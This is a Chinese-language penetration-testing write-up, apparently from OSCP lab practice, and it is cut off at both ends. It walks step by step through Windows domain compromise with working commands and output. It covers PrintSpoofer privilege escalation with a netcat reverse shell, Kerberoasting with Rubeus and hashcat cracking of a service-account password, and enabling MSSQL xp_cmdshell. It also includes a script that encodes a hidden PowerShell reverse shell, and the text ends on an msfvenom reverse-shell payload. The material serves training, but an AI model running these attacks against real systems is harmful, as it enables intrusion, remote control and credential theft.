SeTimeZonePrivilege           Change the time zone                      Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 MS01
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19044 N/A Build 19044
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec
Registered Organization:
Product ID:                00331-10000-00001-AA408
Original Install Date:     3/25/2022, 6:55:24 AM
System Boot Time:          7/11/2023, 9:00:49 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,935 MB
Virtual Memory: Max Size:  7,039 MB
Virtual Memory: Available: 5,933 MB
Virtual Memory: In Use:    1,106 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    oscp.exam
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB5013624
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB5003791
                           [08]: KB5019959
                           [09]: KB5011352
                           [10]: KB5018506
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.207.147
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.97.147
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

c:\windows\system32\inetsrv>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.207.147
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.207.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.97.147
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

發現有 SeImpersonatePrivilege 且系統為 win10，嘗試使用 printspoofer 提權

靶機
```json
c:\Windows\Temp>.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 192.168.45.206 5555 -e cmd"
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 192.168.45.206 5555 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

kali:
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/147]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.207.147] 60384
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

成功提權！

上傳 mimikatz 並執行，並未發現有用的 credential
嘗試執行 kerberoasting 攻擊，上傳 Rubeus.exe 並執行
```json
C:\Windows\Temp>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : oscp.exam
[*] Searching path 'LDAP://DC01.oscp.exam/DC=oscp,DC=exam' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : MSSQL/MS02.oscp.exam
[*] PwdLastSet             : 11/10/2022 12:03:18 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\hashes.kerberoast


[*] SamAccountName         : web_svc
[*] DistinguishedName      : CN=web_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : HTTP/MS01.oscp.exam
[*] PwdLastSet             : 11/10/2022 11:11:19 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Windows\Temp\hashes.kerberoast

[*] Roasted hashes written to : C:\Windows\Temp\hashes.kerberoast
```

```json
C:\Windows\Temp>type hashes.kerberoast
type hashes.kerberoast
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$F093B45971E89CD4CABCA35D287BFD79$89614E98D50C12A378A9445717DCD393ADFD04590569C4D5DA7605FFCE9EFDD592EF3E80AD19113A37BF56A22847BB3DBD7F718F8ACDF3BD2D42EE7F21339D924D34C0E488667AE3AF1B1F69C8414C59CB933BF6460B5CFA2F76ADA15E8B6B8D040D619CBC541AABB09B5BCB64321220AB2EB155988C368BF1E1E4FF368809D7156319B8274E81C08D5DCF0B9B0072C0306B512C6F7F153DB43FBDA550E1CC4049DB69E1C636E42F03085A67806660EBDD2465689C2F13D3628B25CAF96E966949E49C7491199C982F7183D2C618A6D265637F004E638976B9369E0E3C51E2048D5785C82D298802A8821C73253AAABE340B5DB3F5216136A155639006535C9437E47B3CE3E45E46BA100541142590C3692311128DBDA6708575BB5FF2328A386F282D6F40A7DBE64F34CA18B4341126093E9A4244FDFF11580F2CD68D178E98FDD18AAE8F1861D34CB419D1CB3FCD206BAEC6D81E220A93016FC068B3F7F4A98A408F7DD3A5A1BDFC1572D14A0F3DC22421F1AF6F4687AC40700D9F81F9AF0E7F45910BEEEBC3CBC7010A1253B61FCCF2D69D2B31CA025A7075B62636A2B19C7159EB3A3ACBE8991B6FA52027ADB6B3718FE2BAE9D998D7CF08BEFA80CA4D8D060589CB59905EDD0A2F7D5057C645529636C83608E7AA46A3B8191018646654B39E146AEB97D481A40C10B8EB032040790C58F4E6270303F35400D5762552FF958DF3B1824FFDE8F073663B7698A6051AE757C14A3BF80839CA4F4DC28FC812AE0F810C9CA5471540AC0B8818BE0FECD5ADAD75B260AE289E7D39C75201D26C7B979EE59E83A0436850A7C3913EEBD287AAFA7B7B5D81665B77CE80E7C84B68475196A40905708EA288F053E90EA6C684580DAEBC7E457282F90E19F1B693536FF6025B23FC1F74AD9753CCF66E9589C01E39CD8F8A38E239D5D2305FBFAAE18CCFB85D92F42868A373C77013911D8FF326D4F1ECF9141239F59EECF3D91BC67B97650E65583D32283810B7C5D71D7D985D55B2D9A9F1525EB339CF85F4B88F18138C443E20C6B744287DB3B66A0609B7B6280455BF102EA309DBE966300DD5D455B53B799DA47EC066D05C4E0248D11A2B379D5FDFC42EECEC6730D3894B688350AA581AD18249AE0937FAFE1F7756B2971255D87E629D0ED80A43F9FF2F555A8C48C7E945E63E11C9FA32DC1FD63FEEE8BEE0FE2A1DF21E12BE79050B9BDC5CB0BF5FDB0B03163EF5C48B737114DCE9D0CEC4520D47FB467556307549B2FF1D8EC10487A980F7C90C834BC8EFBE96C4E09B210746F881818686EE099D02B944C017A39DAAB2235741C80D31D727780178573C5A6E459C4125C9748F69A9B6194B96C1A83B8C2259F0A8AC393FF30547A18E2C595F0338355A29CE28B480FB225404EEB1C9D7E7AA0447DB0CA9E46187105E1ADE21C9B227D1598A5A4419DAAA86FA8D1B5E98C29F05ED3F136124B8C59FF77192CB3503712642E3129861E35510E2C0A34240FAA2508DFDD8E2F1A823748540A30AB79779
$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$A202E1A03921B2E61DF01D7C6E3392F3$13CAA78AFC1154788286425B7A5153AA86D822EFBDC6506BF32FC0ED6A141E25E5725E2A9637DB9BC1D27BB28C817B97FF04286CAA15A074FF058844466F2954DE0632A932D38E1CA03B42939EB5012256E31F97226B26F15DFD89523EC60BA3C11E52EA7F6E5C9538B6EE7ED4DD8FBA925196C0B1D73CD92CF58E395E6D26F4BA06F7420899D2E322963DDFFFFFC304BE0E16AE41F9FA130DBF2F6D7DB0756CB395BCA2F429AA1FF92CF061EDE2BEB12E306998A28E5D880F110F046E6E51EA8D07D8DA7147DDC84C04E8F8493BFEDB481751E083A3A2A9B21584D6AD4BB8D53B06B19F39307B484C02B94E4A09C1F4ABCB4C69B7CFCA83C6D0A36D3488FAA6D560ACCAD6F41163C3922DEBF072698D57D1A3A41A53B707A1006B7AE067F32E898693199E6019C175CD1F97E5D210BF90A0A2EA1EEC859334F4FEFC30FEF49C114B2B77E762BEA47645BBC662380E04C0DB50EA0E92147FB4C9736CED8A5311CDA2FCB5C39391102624DAA6F7DC5725A1C4080AC225B5E719461DAD3D72E3F3E35F78F088ECFE136FE6FD19EE66C5B49A7A56021ED56ABA5E21AD78839AD25A4CBF48A2DC39CE748F1E19BE9E658713A97DC956B428D025C673D91801CB679FFA067343C2FA0F5B701421DACF6B756F6578A275CA850A332C6265A4636866E2F971BED55D05120D5BF3A24832610B8AD8B8AF729276FE8B771CC16C67201D639E0227EFB37DFE6C8BF5EA6CBC0C676CAB54FEA79B56F35D1276284383CF1AF2AF479131FA056282FF646DB8A1B6910F9F8F677D18E6C303E4B125F47A6E8C13A4979E7671AFF8A163C0C44DACD0EDFA96076BB1F8BFC220BE7DAC91F512B7364E40614ECF972D0A5186BE9FD250A0225A6484315CE40E7949E44BA4AC8388FF7D12F02DF973D6FDDD1FE1B91601A3AE0B9F165F4AAC7B3440F0165E691B19CE8A3057431473AE3D6082377A3DB0240586B2A4133068DA7EE6287A26F146F700F2C133E9C558CAFD51ABB0D683D4DFD55509910BE1B7C1A66AA8FA068ED3AAB32D7F88DA42B3B49D17205CBC3161921434AC0DC416C1AAE69214284CBB4DFACFE2268663A084DB0BD5D01B34CD6E2684BBE13B96D3463E04234EC8D677908EBAA17970BFEF4C61326C9786480B2C8AD3AE3BB0E79B27BBDB6A76631E9371C51A6994FE92C97403A7C43EE87C617CD91FAD790BF890B61490F68AA26C4DC5CACE4648C6BD59517AB8782D3DE2B762BCBE7A87DF911165F7687054A121D653245838F2595B61D329DF2E58B56BD68AC1FA7EB449A33ADE25874091AE2D37A129F4D14D8DD9F73BBA57A5A301BA1BE643E8173B38DA9F7123DD34475266B0EE6AFE4F30990E2B8EF0ECB548DE012C2FDFBBD6411DA2F8F644535D7AD4637503FB42F7D70857FFA7B9EE36109376D7205C380ABCD84BBE7EA634260B5359F9EAC0A3E69DAB3F15FAF9954932B8FEF0F555C44974BC56E3E8AD8DD76AC6CDC204CDF9F3F817BB7CC85DA78362D402B7D2065E3CE5BE3D51B19FE36A
```

第一個 hash 可拿來利用，使用 hashcat 爆破

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/148]
└─$ hashcat -a 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2943 MB (512 MB allocatable), 2MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$f093b45971e89cd4cabca35d287bfd79$89614e98d50c12a378a9445717dcd393adfd04590569c4d5da7605ffce9efdd592ef3e80ad19113a37bf56a22847bb3dbd7f718f8acdf3bd2d42ee7f21339d924d34c0e488667ae3af1b1f69c8414c59cb933bf6460b5cfa2f76ada15e8b6b8d040d619cbc541aabb09b5bcb64321220ab2eb155988c368bf1e1e4ff368809d7156319b8274e81c08d5dcf0b9b0072c0306b512c6f7f153db43fbda550e1cc4049db69e1c636e42f03085a67806660ebdd2465689c2f13d3628b25caf96e966949e49c7491199c982f7183d2c618a6d265637f004e638976b9369e0e3c51e2048d5785c82d298802a8821c73253aaabe340b5db3f5216136a155639006535c9437e47b3ce3e45e46ba100541142590c3692311128dbda6708575bb5ff2328a386f282d6f40a7dbe64f34ca18b4341126093e9a4244fdff11580f2cd68d178e98fdd18aae8f1861d34cb419d1cb3fcd206baec6d81e220a93016fc068b3f7f4a98a408f7dd3a5a1bdfc1572d14a0f3dc22421f1af6f4687ac40700d9f81f9af0e7f45910beeebc3cbc7010a1253b61fccf2d69d2b31ca025a7075b62636a2b19c7159eb3a3acbe8991b6fa52027adb6b3718fe2bae9d998d7cf08befa80ca4d8d060589cb59905edd0a2f7d5057c645529636c83608e7aa46a3b8191018646654b39e146aeb97d481a40c10b8eb032040790c58f4e6270303f35400d5762552ff958df3b1824ffde8f073663b7698a6051ae757c14a3bf80839ca4f4dc28fc812ae0f810c9ca5471540ac0b8818be0fecd5adad75b260ae289e7d39c75201d26c7b979ee59e83a0436850a7c3913eebd287aafa7b7b5d81665b77ce80e7c84b68475196a40905708ea288f053e90ea6c684580daebc7e457282f90e19f1b693536ff6025b23fc1f74ad9753ccf66e9589c01e39cd8f8a38e239d5d2305fbfaae18ccfb85d92f42868a373c77013911d8ff326d4f1ecf9141239f59eecf3d91bc67b97650e65583d32283810b7c5d71d7d985d55b2d9a9f1525eb339cf85f4b88f18138c443e20c6b744287db3b66a0609b7b6280455bf102ea309dbe966300dd5d455b53b799da47ec066d05c4e0248d11a2b379d5fdfc42eecec6730d3894b688350aa581ad18249ae0937fafe1f7756b2971255d87e629d0ed80a43f9ff2f555a8c48c7e945e63e11c9fa32dc1fd63feee8bee0fe2a1df21e12be79050b9bdc5cb0bf5fdb0b03163ef5c48b737114dce9d0cec4520d47fb467556307549b2ff1d8ec10487a980f7c90c834bc8efbe96c4e09b210746f881818686ee099d02b944c017a39daab2235741c80d31d727780178573c5a6e459c4125c9748f69a9b6194b96c1a83b8c2259f0a8ac393ff30547a18e2c595f0338355a29ce28b480fb225404eeb1c9d7e7aa0447db0ca9e46187105e1ade21c9b227d1598a5a4419daaa86fa8d1b5e98c29f05ed3f136124b8c59ff77192cb3503712642e3129861e35510e2c0a34240faa2508dfdd8e2f1a823748540a30ab79779:Dolphin1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam...b79779
Time.Started.....: Tue Aug  8 22:58:12 2023 (0 secs)
Time.Estimated...: Tue Aug  8 22:58:12 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   913.1 kH/s (0.46ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 50176/14344385 (0.35%)
Rejected.........: 0/50176 (0.00%)
Restore.Point....: 49664/14344385 (0.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ilovejt -> 151182
Hardware.Mon.#1..: Util: 51%

Started: Tue Aug  8 22:58:03 2023
Stopped: Tue Aug  8 22:58:13 2023
```

成功爆破！
```json
sql_svc/Dolphin1 (MS02.oscp.exam)
```

接著透過 chisel.exe 建立通道，然後使用 proxychains 加上 impacket-mssqlclient 嘗試連線到 MS02
```json
┌──(ouyang㉿kali)-[~]
└─$ proxychains -q impacket-mssqlclient -windows-auth oscp.exam/sql_svc:Dolphin1@10.10.119.148
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

	重連 VPN，IP 換成 192.168.202.xxx & 10.10.92.xxx

```json
SQL> xp_cmdshell dir
[-] ERROR(MS02\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL> enable_xp_cmdshell
[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output

--------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```

嘗試建立 reverse shell，在 147 透過 nc 監聽，並在 148 透過 sql 執行 powershell reverse shell
將 powershell reverse shell 用 base64 加密

```json
┌──(ouyang㉿kali)-[~/tools/powershell_encode]
└─$ vim encode.py

┌──(ouyang㉿kali)-[~/tools/powershell_encode]
└─$ cat encode.py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("10.10.92.147",6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

┌──(ouyang㉿kali)-[~/tools/powershell_encode]
└─$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AOQAyAC4AMQA0ADcAIgAsADYANgA2ADYAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

148 SQL:
```json
SQL> EXEC master..xp_cmdshell 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AOQAyAC4AMQA0ADcAIgAsADYANgA2ADYAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

147 nc:
```
```json
C:\Windows\Temp>.\nc.exe -nvlp 6666
.\nc.exe -nvlp 6666
listening on [any] 6666 ...
connect to [10.10.92.147] from (UNKNOWN) [10.10.92.148] 63234
whoami


nt service\mssql$sqlexpress
PS C:\Windows\system32>
```

## 148 提權

先查看權限
```json
PS C:\Windows\system32> whoami /all
PS C:\Windows\system32>
PS C:\Windows\system32>

USER INFORMATION
----------------

User Name                   SID
=========================== ===============================================================
nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

發現有 SeImpersonatePrivilege 權限
接著查看系統資訊
```json
PS C:\Windows\system32> systeminfo
PS C:\Windows\system32>
PS C:\Windows\system32>


Host Name:                 MS02
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          offsec
Registered Organization:
Product ID:                00331-10000-00001-AA129
Original Install Date:     3/25/2022, 6:55:40 AM
System Boot Time:          7/11/2023, 9:45:51 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,411 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,570 MB
Virtual Memory: In Use:    2,229 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    oscp.exam
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB5010472
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB5011487
                           [08]: KB5011352
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.92.148
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

發現是 win10，可嘗試使用 PrintSpoofer64.exe 提權
可透過 147 之 web service 將檔案丟到 148，先透過 ftp 將 printspoofer64.exe 上傳到 wwwroot 裏面



製作一個 reverse shell 到 147 讓 printspoofer64.exe 提權彈 shell
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/148]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.92.147 LPORT=7777 -f exe -o shell.exe
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
